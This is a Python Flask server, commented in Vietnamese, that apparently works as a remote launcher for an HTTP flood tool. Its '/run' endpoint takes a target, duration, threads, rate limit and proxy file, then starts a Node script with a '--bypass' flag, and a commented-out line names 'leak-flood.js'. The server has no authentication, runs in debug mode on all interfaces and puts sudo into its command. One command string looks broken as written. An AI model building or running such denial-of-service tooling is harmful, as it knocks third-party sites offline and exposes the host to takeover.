from flask import Flask, request, jsonify
import subprocess
import threading
import os, signal

app = Flask(__name__)

def stream_logs(process):
    """Đọc log từ Node.js và in realtime ra console Flask"""
    try:
        for line in iter(process.stdout.readline, ''):
            if line:
                print("[NODE]", line.strip(), flush=True)
    except Exception as e:
        print("[ERROR LOG]", e, flush=True)

@app.route("/run", methods=["POST"])
def run_node():
    data = request.get_json()

    target = data.get("target")
    time = str(data.get("time"))
    threads = str(data.get("threads"))
    ratelimit = str(data.get("ratelimit"))
    proxyfile = data.get("proxyfile")
    flags = data.get("flags", [])

#     cmd = ["stdbuf", "-oL", "node", "leak-flood.js", target, time, threads, ratelimit, proxyfile] + flags
    cmd = ["stdbuf", "-oL", "sudo xvfb-run -a node", "--trace-warnings", "browser.mjs",
       target, time, threads, ratelimit, proxyfile, '--debug', '--reset', '--bypass'] + flags
    try:
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True
        )

        # chạy thread đọc log song song
        threading.Thread(target=stream_logs, args=(process,), daemon=True).start()

        return jsonify({
            "message": "Node script started",
            "pid": process.pid,
            "command": " ".join(cmd)
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/stop", methods=["POST"])
def stop_node():
    data = request.get_json()
    pid = data.get("pid")
    if not pid:
        return jsonify({"error": "Missing pid"}), 400

    try:
        os.kill(pid, signal.SIGTERM)  # hoặc SIGKILL nếu cần
        return jsonify({"message": f"Process {pid} stopped"})
    except Exception as e:
        return jsonify({"error": str(e)}), 500
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
